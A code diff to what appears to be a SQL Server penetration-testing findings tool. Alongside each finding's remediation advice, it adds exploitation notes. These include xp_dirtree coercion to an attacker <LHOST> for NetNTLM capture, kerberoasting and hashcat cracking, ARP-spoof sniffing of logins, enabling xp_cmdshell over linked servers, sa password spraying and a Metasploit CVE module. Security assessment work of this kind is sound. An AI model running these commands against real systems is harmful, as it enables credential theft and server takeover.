@@ -1115,7 +1115,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
                           "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                     "Restrict exposure; require SMB signing + EPA to blunt relay.",
-                    ["CWE-200"], kind="ntlm_disclosure"))
+                    ["CWE-200"], kind="ntlm_disclosure",
+                    exploit_note=(
+                        "responder -I <iface> already listening; then trigger "
+                        "EXEC xp_dirtree '\\\\<LHOST>\\x' via any authenticated "
+                        "login to relay/capture the SQL svc acct."),
+                    depth_tier="t1"))
             elif "ms-sql-ntlm-info" in scripts:
                 out.append(_finding(
                     "low", "MSSQL discloses NetBIOS / domain / FQDN pre-auth",
@@ -1124,7 +1129,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
                           "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                     "Restrict exposure; require SMB signing + EPA to blunt relay.",
-                    ["CWE-200"], kind="ntlm_disclosure"))
+                    ["CWE-200"], kind="ntlm_disclosure",
+                    exploit_note=(
+                        "responder -I <iface> already listening; then trigger "
+                        "EXEC xp_dirtree '\\\\<LHOST>\\x' via any authenticated "
+                        "login to relay/capture the SQL svc acct."),
+                    depth_tier="t1"))
 
             # Kerberos SPN kerberoast target. The pre-auth NTLM leak already
             # gave us the FQDN of an AD-integrated instance; any authenticated
@@ -1155,7 +1165,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "service account so the returned TGS is not crackable offline; "
                     "enforce AES-only Kerberos on the account.",
                     ["CWE-262", "CWE-522"],
-                    kind="mssql_kerberoastable_spn"))
+                    kind="mssql_kerberoastable_spn",
+                    exploit_note=(
+                        "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip "
+                        "<dc-ip> -request; then hashcat -m 13100 tgs.hash "
+                        "rockyou.txt."),
+                    depth_tier="t0"))
 
             # TDS login encryption not supported at all -> creds sniffable.
             enc = pl.get("encryption")
@@ -1167,7 +1182,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("impacket-mssqlclient <user>@<ip> -p <port>   # traffic is unencrypted",
                           ctx),
                     "Install a certificate and enable Force Encryption on the instance.",
-                    ["CWE-319"], kind="no_encryption"))
+                    ["CWE-319"], kind="no_encryption",
+                    exploit_note=(
+                        "Position on-path (ettercap -Tq -M arp:remote "
+                        "/<sqlclient>/ /<sqlsrv>/); capture with tcpdump port "
+                        "1433; extract LOGIN7 payload — password is obfuscated "
+                        "with nibble-swap+0xA5, trivially reversed."),
+                    depth_tier="t1"))
 
             # Unsupported / end-of-life SQL Server (no security patches).
             ver = pl.get("version") or t.version
@@ -1179,7 +1200,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "security updates.", "version",
                     _fill("nmap -p <port> --script ms-sql-info <ip>", ctx),
                     "Upgrade to a supported SQL Server release.",
-                    ["CWE-1104"], kind="eol"))
+                    ["CWE-1104"], kind="eol",
+                    exploit_note=(
+                        "For SQL 2012/2014 SSRS on same host: msf exploit/"
+                        "windows/mssql/mssql_ssrs_navcorrector (CVE-2020-0618); "
+                        "otherwise consult MSRC bulletins."),
+                    depth_tier="t0"))
     return out
 
 
@@ -1733,7 +1759,13 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "a privileged account (sa) on the remote.", "impacket-mssqlclient / mssqlpwner",
             _fill("SELECT * FROM OPENQUERY([%s], 'SELECT SYSTEM_USER, "
                   "IS_SRVROLEMEMBER(''sysadmin'')');" % links[0], ctx),
-            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"], kind="linked_reachable"))
+            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"], kind="linked_reachable",
+            exploit_note=(
+                "SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, "
+                "IS_SRVROLEMEMBER(''sysadmin'')'); if sa, EXEC('sp_configure "
+                "''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') "
+                "AT [LINKED]."),
+            depth_tier="t1"))
 
     cfg = {r[0]: r[1] for r in enum.get("config", []) if len(r) > 1}
     if cfg.get("xp_cmdshell") == "1":
@@ -1903,7 +1935,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "to password spraying / offline cracking.",
             "nxc", _fill("nxc mssql <ip> -u sa -p <wordline> --local-auth", ctx),
             "Prefer Windows-only auth; if SQL logins are required, enforce a strong "
-            "password policy and disable/rename sa.", ["CWE-262"], kind="mixed_mode"))
+            "password policy and disable/rename sa.", ["CWE-262"], kind="mixed_mode",
+            exploit_note=(
+                "nxc mssql <ip> -u sa -p passwords.txt --local-auth "
+                "--continue-on-success — with the sa hash from sys.sql_logins "
+                "if you already have that."),
+            depth_tier="t0"))
 
     # Dangerous server-level permissions held by this login (beyond the sysadmin role).
     my_server = {r[0].upper() for r in enum.get("serverperms", []) if r and r[0]}
@@ -1938,7 +1975,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             _fill("SELECT * FROM sys.server_permissions p JOIN sys.server_principals s "
                   "ON p.grantee_principal_id=s.principal_id WHERE s.name='public';", ctx),
             "Revoke non-baseline grants from public.", ["CWE-284", "CWE-732"],
-            kind="public_role"))
+            kind="public_role",
+            exploit_note=(
+                "CREATE LOGIN test WITH PASSWORD='x'; login as test; verify "
+                "inherited dangerous perm; then abuse per server_perms tester "
+                "step."),
+            depth_tier="t1"))
 
     # Startup stored procedures - auto-run as sysadmin at every service start.
     startup = [r[0] for r in enum.get("startup", []) if r and r[0]]
@@ -1952,7 +1994,13 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             _fill("SELECT name FROM master.sys.procedures WHERE "
                   "OBJECTPROPERTY(object_id,'ExecIsStartup')=1;", ctx),
             "Remove unexpected startup procedures; disable 'scan for startup procs' if "
-            "not needed.", ["CWE-506"], kind="startup_proc"))
+            "not needed.", ["CWE-506"], kind="startup_proc",
+            exploit_note=(
+                "SELECT name, OBJECT_DEFINITION(object_id) FROM "
+                "master.sys.procedures WHERE OBJECTPROPERTY(object_id,"
+                "'ExecIsStartup')=1; hunt for xp_cmdshell / EXEC master.dbo. "
+                "/ net user."),
+            depth_tier="t0"))
 
     if not is_sa and not chain:
         chain.append(f"low-priv login as {me} - hunt for a linked-server or db_owner path")
@@ -2087,7 +2135,13 @@ def link_findings(target: dict, nodes: list[dict], creds: dict | None):
                 for n in nodes[:10]) + f". Deepest: {' -> '.join(deepest['path'])}.",
             "impacket-mssqlclient / mssqlpwner",
             _nested_at(deepest["path"], "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
-            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"], kind="linked_reachable"))
+            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"], kind="linked_reachable",
+            exploit_note=(
+                "SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, "
+                "IS_SRVROLEMEMBER(''sysadmin'')'); if sa, EXEC('sp_configure "
+                "''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') "
+                "AT [LINKED]."),
+            depth_tier="t1"))
     return fs, chain
 
 
@@ -2426,7 +2480,11 @@ def permmine_findings(target: dict, perms: dict, creds: dict | None):
             _fill("EXECUTE AS USER='guest'; SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES;",
                   ctx),
             "Revoke CONNECT from guest in user databases (guest should be disabled).",
-            ["CWE-284"], kind="guest_enabled"))
+            ["CWE-284"], kind="guest_enabled",
+            exploit_note=(
+                "USE [<db>]; EXECUTE AS USER='guest'; SELECT * FROM "
+                "INFORMATION_SCHEMA.TABLES; sample any sensitive table listed."),
+            depth_tier="t1"))
     # Notable public/guest object grants (write/execute or broad read).
     strong = {"INSERT", "UPDATE", "DELETE", "EXECUTE", "CONTROL", "ALTER",
               "TAKE OWNERSHIP", "SELECT"}
